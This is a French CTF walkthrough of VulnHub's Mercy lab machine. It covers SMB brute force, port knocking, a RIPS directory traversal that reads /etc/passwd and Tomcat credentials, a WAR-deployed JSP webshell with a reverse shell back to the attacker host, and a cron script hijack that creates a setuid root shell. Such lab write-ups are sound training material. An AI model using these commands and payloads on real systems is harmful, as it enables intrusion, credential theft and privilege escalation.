---
title: "Solution du CTF Mercy de VulnHub"
tags: [CTF, VulnHub]
---

[MERCY](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) est un CTF proposé sur VulnHub qui fait partie d'une série baptisée *digitalworld.local*. Les CTFs ont été créés par un certain *Donavan*.

J'ai déjà résolu le [CTF Bravery]({% link _posts/2021-12-14-Solution-du-CTF-Bravery-de-VulnHub.md %}) qui fait partie de cette série.

## L'homme qui murmurait à l'oreille des ports

```console
$ sudo nmap -sCV -p- -T5 192.168.56.118
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:08 CET
Nmap scan report for 192.168.56.118
Host is up (0.00047s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES SASL STLS TOP AUTH-RESP-CODE PIPELINING UIDL CAPA
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LOGINDISABLEDA0001 more SASL-IR IDLE ENABLE have post-login capabilities listed LOGIN-REFERRALS LITERAL+ ID IMAP4rev1 Pre-login STARTTLS OK
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imaps?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
995/tcp  open     ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat
MAC Address: 08:00:27:10:02:A8 (Oracle VirtualBox virtual NIC)
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-03-06T16:08:52
|_  start_date: N/A
|_clock-skew: mean: -1h40m02s, deviation: 4h37m07s, median: 59m57s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2023-03-07T00:08:51+08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

Intéressant, on note que les ports 80 et 22 sont derrières un pare-feu.

SMB / Netbios étant ouverts je vais fouiller de ce côté avec les outils habituels :

```console
$ smbclient -U "" -N -L //192.168.56.118

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        qiu             Disk      
        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N //192.168.56.118/qiu
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Il y a donc un partage nommé `qiu` mais on ne peut pas y accéder anonymement.

Utilisons un script NSE pour énumérer les utilisateurs :

```console
$ sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 192.168.56.118
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 13:18 CET
Nmap scan report for 192.168.56.118
Host is up (0.00043s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 08:00:27:10:02:A8 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-users: 
|   MERCY\pleadformercy (RID: 1000)
|     Full name:   QIU
|     Description: 
|     Flags:       Normal user account
|   MERCY\qiu (RID: 1001)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

On a deux utilisateurs. Tentons de brute-forcer un mot de passe.

Cette fois je suis passé directement à mon script [brute_smb_share: Brute force a SMB share](https://github.com/devl00p/brute_smb_share) plutôt que de tenter un *Hydra* et autres :

```console
$ python3 brute_smb_share.py 192.168.56.118 qiu users.txt tools/wordlists/rockyou.txt 
Success with user qiu and password password
        .bashrc
        .public
        .bash_history
        .cache
        .private
        .bash_logout
        .profile
```

Avec ce mot de passe faible (`password`) je peux me connecter au partage SMB avec le compte `qiu`. On peut lire son historique bash :

```bash
exit
cd ../
cd home
cd qiu
cd .secrets
ls -al
cd .private
ls
cd secrets
ls
ls -al
cd ../
ls -al
cd opensesame
ls -al
./configprint
sudo configprint
sudo su -
exit
```

On trouve aussi un script baptisé `configprint` :

```bash
#!/bin/bash

echo "Here are settings for your perusal." > config
echo "" >> config
echo "Port Knocking Daemon Configuration" >> config
echo "" >> config
cat "/etc/knockd.conf" >> config
echo "" >> config
echo "Apache2 Configuration" >> config
echo "" >> config
cat "/etc/apache2/apache2.conf" >> config
echo "" >> config
echo "Samba Configuration" >> config
echo "" >> config
cat "/etc/samba/smb.conf" >> config
echo "" >> config
echo "For other details of MERCY, please contact your system administrator." >> config

chown qiu:qiu config
```

Il génère un fichier `config` qui est la concaténation de différents fichiers. Seul le début nous intéresse :

```ini
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

On peut port-knocker pour ouvrir le port SSH avec une séquence de ports. J'ai bêtement utilisé une suite de `ncat` :

```bash
ncat -w 1 -z 192.168.56.118 17301; ncat -w 1 -z 192.168.56.118 28504; ncat -w 1 -z 192.168.56.118 9999
```

J'ai tenté de me connecter au SSH avec les identifiants `qiu` / `password`. On atteint bien le serveur, mais le mot de passe est refusé.

On a aussi la config du Samba et on a la confirmation que l'on ne peut pas faire grand-chose avec ce partage qui est en lecture seule :

```ini
[qiu]
path = /home/qiu
valid users = qiu
read only = yes
```

J'ai donc port-knocké de la même façon, mais avec la séquence attendue pour ouvrir le port 80.

## Il nettoyait son scanner et s'est tiré une balle dans le pied

De là j'ai lancé une énumération web :

```console
$ feroxbuster -u http://192.168.56.118/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -n 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.118/
 🚀  Threads               │ 50
 📖  Wordlist              │ ble-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        5l       13w       90c http://192.168.56.118/index.html
403       10l       30w      290c http://192.168.56.118/.htaccess
200        1l        1w       67c http://192.168.56.118/login.html
200        3l        6w       50c http://192.168.56.118/robots.txt
200        5l       13w       90c http://192.168.56.118/
403       10l       30w      286c http://192.168.56.118/.html
403       10l       30w      285c http://192.168.56.118/.php
403       10l       30w      290c http://192.168.56.118/.htpasswd
403       10l       30w      285c http://192.168.56.118/.htm
403       10l       30w      291c http://192.168.56.118/.htpasswds
403       10l       30w      289c http://192.168.56.118/.htgroup
403       10l       30w      294c http://192.168.56.118/wp-forum.phps
403       10l       30w      294c http://192.168.56.118/.htaccess.bak
403       10l       30w      288c http://192.168.56.118/.htuser
403       10l       30w      285c http://192.168.56.118/.htc
403       10l       30w      284c http://192.168.56.118/.ht
403       10l       30w      294c http://192.168.56.118/.htaccess.old
403       10l       30w      289c http://192.168.56.118/.htacess
[####################] - 30s    37034/37034   0s      found:18      errors:0      
[####################] - 30s    37034/37034   1213/s  http://192.168.56.118/
```

Le fichier `robots.txt` contient deux entrées :

```
User-agent: *
Disallow: /mercy
Disallow: /nomercy
```

Sur `/nomercy` on trouve une installation de `RIPS` en version *0.53*. `RIPS` est un outil permettant d'auditer la sécurité du code PHP. Je l'ai déjà utilisé par le passé et il est plutôt efficace.

De mémoire, il fonctionne que sur du PHP non-objet, il faut payer une version commerciale pour le PHP orienté objet.

Quoi qu'il en soit je peux l'utiliser pour scanner ce qui se trouve sous la racine web en remontant l'arborescence :

![RIPS scan files in /var/www/html](/assets/img/vulnhub/mercy_rips.png)

`RIPS` semble trouver une faille de directory traversal dans lui-même, ce qui n'est pas surprenant puisque le fait de lire les fichiers est une feature du logiciel.

![RIPS directory traversal](/assets/img/vulnhub/mercy_rips_lfi.png)

À vrai dire j'aurais aussi pu chercher sur _exploit-db_ : [RIPS 0.53 - Multiple Local File Inclusions - PHP webapps Exploit](https://www.exploit-db.com/exploits/18660)

Notez que l'exploit indique *file inclusion* alors qu'aucune interprétation de code PHP n'a lieu.

Dans tous les cas je peux accéder au disque de cette façon :

`http://192.168.56.118/nomercy/windows/code.php?file=/etc/passwd`

J'obtiens alors la liste des utilisateurs dont ceux-ci :

```
tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
fluffy:x:1003:1003::/home/fluffy:/bin/sh
```

`RIPS` permet aussi de scanner dans les fichiers en spécifiant une expression régulière. Malheureusement j'ai l'impression que les chemins auxquels l'application à accès se résument à `/var/www/html` ou sans doute aux fichiers avec l'extension `.php`.

Par conséquent, impossible d'utiliser le logiciel pour fouiller dans `/home`.

## Make a SHELL, not WAR

Je me rappelle alors que sur le port 8080 se trouve un serveur *Tomcat* qui demande des identifiants. J'utilise donc le directory traversal pour extraire le fichier de configuration de *Tomcat* contenant les identifiants (`/etc/tomcat7/tomcat-users.xml`) :

```xml
<user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<user username="fluffy" password="freakishfluffybunny" roles="none"/>
```

Aucun de ces mots de passe ne permet un accès SSH mais le premier donne bien un accès admin sur le *Tomcat*. Dès lors, on se rend sur `http://192.168.56.118:8080/manager/html` pour uploader un fichier `.war`.

J'ai d'abord essayé avec celui que j'avais utilisé notamment sur le CTF [Thales]({% link _posts/2022-11-03-Solution-du-CTF-Thales-1-de-VulnHub.md %}) : [GitHub - p0dalirius/Tomcat-webshell-application: A webshell application and interactive shell for pentesting Apache Tomcat servers.](https://github.com/p0dalirius/Tomcat-webshell-application)

Malheureusement ce dernier ne semble pas fonctionner avec cette version de *Tomcat*, j'obtiens un status 500 et un message d'erreur trop *Java* à mon goût.

J'ai alors eu recours à *tomcatWarDeployer* (du moins un fork qui tente de corriger différents bugs dans la version officielle : [GitHub - flavargues/tomcatWarDeployer: Apache Tomcat auto WAR deployment &amp; pwning penetration testing tool.](https://github.com/flavargues/tomcatWarDeployer))

Pour autant ce n'est pas parfait :

```console
$ python tomcatWarDeployer.py -v -U thisisasuperduperlonguser -P heartbreakisinevitable -x -p 9999 -H 192.168.56.1 192.168.56.118:8080

        tomcatWarDeployer (v. 0.5.2)
        Apache Tomcat auto WAR deployment & launching tool
        Mariusz Banach / MGeeky '16-18

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.

INFO: Reverse shell will connect to: 192.168.56.1:9999.
DEBUG: Trying Creds: ["thisisasuperduperlonguser:heartbreakisinevitable"]:
        Browsing to "http://192.168.56.118:8080/"...
DEBUG: Trying to fetch: "http://192.168.56.118:8080/"
DEBUG: Trying to fetch: "http://192.168.56.118:8080/manager"
DEBUG: Probably found something: Apache Tomcat/7.0.52 (Ubuntu)
INFO: Apache Tomcat/7.0.52 (Ubuntu) Manager Application reached & validated.
INFO:   At: "http://192.168.56.118:8080/manager"
DEBUG: Generating JSP WAR backdoor code...
DEBUG: Preparing additional code for Reverse TCP shell
DEBUG: Generating temporary structure for jsp_app WAR at: "/tmp/tmpps99qama"
DEBUG: Working with Java at version: 11.0.18
DEBUG: Generating web.xml with servlet-name: "JSP Application"
DEBUG: Generating WAR file at: "/tmp/jsp_app.war"
DEBUG: b'adding: META-INF/ (in=0) (out=0) (stored 0%)\nadding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)\nadding: files/ (in=0) (out=0) (stored 0%)\nadding: files/META-INF/ (in=0) (out=0) (stored 0%)\nadding: files/META-INF/MANIFEST.MF (in=67) (out=66) (deflated 1%)\nadding: files/WEB-INF/ (in=0) (out=0) (stored 0%)\nadding: files/WEB-INF/web.xml (in=505) (out=254) (deflated 49%)\nadding: index.jsp (in=4495) (out=1684) (deflated 62%)\nTotal:\n------\n(in = 5107) (out = 2914) (deflated 42%)'
DEBUG: WAR file structure:
DEBUG: b'/tmp/tmpps99qama\n\xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80 files\n\xe2\x94\x82\xc2\xa0\xc2\xa0 \xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80 META-INF\n\xe2\x94\x82\xc2\xa0\xc2\xa0 \xe2\x94\x82\xc2\xa0\xc2\xa0 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 MANIFEST.MF\n\xe2\x94\x82\xc2\xa0\xc2\xa0 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 WEB-INF\n\xe2\x94\x82\xc2\xa0\xc2\xa0     \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 web.xml\n\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 index.jsp\n\n4 directories, 3 files'
DEBUG: Checking if app jsp_app is deployed at: http://192.168.56.118:8080/manager
WARNING: Application with name: "jsp_app" is already deployed.
DEBUG: Unloading existing one...
DEBUG: Unloading application: "http://http://192.168.56.118:8080/jsp_app/"
DEBUG: Succeeded.
DEBUG: Deploying application: jsp_app from file: "/tmp/jsp_app.war"
DEBUG: Removing temporary WAR directory: "/tmp/tmpps99qama"
INFO: WAR DEPLOYED! Invoking it...
DEBUG: Spawned shell handling thread. Awaiting for the event...
DEBUG: Awaiting for reverse-shell handler to set-up
DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.56.1:9999
DEBUG: Socket is binded to local port now, awaiting for clients...
DEBUG: Invoking application at url: "http://192.168.56.118:8080/jsp_app/"
DEBUG: Adding 'X-Pass: PezMjeRnRaGZ' header for shell functionality authentication.
DEBUG: Incoming client: 192.168.56.118:35122
DEBUG: Application invoked correctly.
INFO: ------------------------------------------------------------
INFO: JSP Backdoor up & running on http://192.168.56.118:8080/jsp_app/
INFO: 
Happy pwning. Here take that password for web shell: 'PezMjeRnRaGZ'
INFO: ------------------------------------------------------------

Exception in thread Thread-1 (shellHandler):
Traceback (most recent call last):
  File "/usr/lib64/python3.10/threading.py", line 1016, in _bootstrap_inner
    self.run()
  File "/usr/lib64/python3.10/threading.py", line 953, in run
    self._target(*self._args, **self._kwargs)
  File "/tmp/tomcatWarDeployer/tomcatWarDeployer/tomcatWarDeployer.py", line 229, in shellHandler
    shellLoop(sock, host)
  File "/tmp/tomcatWarDeployer/tomcatWarDeployer/tomcatWarDeployer.py", line 141, in shellLoop
    if 'Microsoft Windows [Version' in initialRecv.decode():
AttributeError: 'str' object has no attribute 'decode'. Did you mean: 'encode'?
```

Il semble que le fork ait oublié de corriger quelques cas... Au moins il a laissé un webshell à l'URL présente dans l'output. J'en profite pour récupérer un *reverse-ssh* via `wget` depuis ma machine et les affaires reprennent.

## Je nettoyais mon bash et le coup est parti tout seul

Le second couple utilisateur / mot de passe qui était dans la configuration *Tomcat* permet la connexion via `su` :

```console
tomcat7@MERCY:/tmp$ su fluffy
Password: 
Added user fluffy.

$ find . -ls
143983    4 drwxr-x---   3 fluffy   fluffy       4096 Nov 20  2018 .
143999    4 -rw-------   1 fluffy   fluffy         12 Nov 20  2018 ./.bash_history
143991    4 drwxr-xr-x   3 fluffy   fluffy       4096 Nov 20  2018 ./.private
270860    4 drwxr-xr-x   2 fluffy   fluffy       4096 Nov 20  2018 ./.private/secrets
270862    4 -rwxr-xr-x   1 fluffy   fluffy         37 Nov 20  2018 ./.private/secrets/backup.save
270861    4 -rwxrwxrwx   1 root     root          222 Nov 20  2018 ./.private/secrets/timeclock
270863    4 -rw-r--r--   1 fluffy   fluffy         12 Nov 20  2018 ./.private/secrets/.secrets
```

L'utilisateur dispose d'un script qui est visiblement exécuté via une crontab :

```bash
$ cat .private/secrets/timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

En effet, le fichier mentionné est récent :

```console
$ ls -al ../../../../../var/www/html/time
-rw-r--r-- 1 www-data www-data 79 Mar  7 05:27 ../../../../../var/www/html/time
$ date
Tue Mar  7 05:29:15 +08 2023
```

Ajouté à l'utilisation de `chown`, on se dit qu'un utilisateur plus privilégié (donc `root`) lance ce script.

Tentons le tout pour le tout :

```console
$ echo "cp /bin/dash /tmp/;chmod 4755 /tmp/dash" >> .private/secrets/timeclock
$ sleep 60
$ ls -al /tmp/dash
-rwsr-xr-x 1 root root 112204 Mar  7 05:33 /tmp/dash
$ /tmp/dash
# id
uid=1003(fluffy) gid=1003(fluffy) euid=0(root) groups=0(root),1003(fluffy)
# cd /root
# ls
author-secret.txt  config  proof.txt
# cat proof.txt
Congratulations on rooting MERCY. :-)
```

Victoire !
